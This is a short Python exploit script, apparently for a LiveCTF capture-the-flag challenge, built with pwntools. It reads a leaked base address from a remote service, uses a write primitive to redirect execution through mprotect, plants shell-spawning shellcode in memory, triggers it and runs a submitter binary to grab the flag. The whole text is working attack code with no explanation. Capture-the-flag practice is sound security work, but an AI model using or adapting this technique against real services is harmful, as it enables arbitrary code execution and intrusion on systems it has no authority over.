from pwn import *
context.log_level='info'
context.arch='AMD64'
context.terminal=['lxterminal','-e']

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
r = remote(HOST, int(PORT))

p=r
#p=process("./challenge")
ebase=u64(p.recv(8))
def wr64(radr,val):
    p.send(p64(radr+ebase)+p64(val))
mprotect=ebase+0x1370

wr64(0x4330,mprotect)
wr64(0x4338,ebase+0x2000)
p.send(p64(0))
p.send(p32(0))
p.recvline()
dyn=ebase+0x4340
smcbase=0x2110

sc=asm(shellcraft.sh()).ljust(64,b'\x90')
for i in range(0,len(sc),8):
    wr64(smcbase+i,u64(sc[i:i+8]))
p.send(p64(dyn))
p.recv(8)
p.sendline(b'./submitter')
flag = p.recvline_contains(b'LiveCTF{').decode().strip()
#print(flag)
log.info('Flag: %s', flag)
#p.interactive()
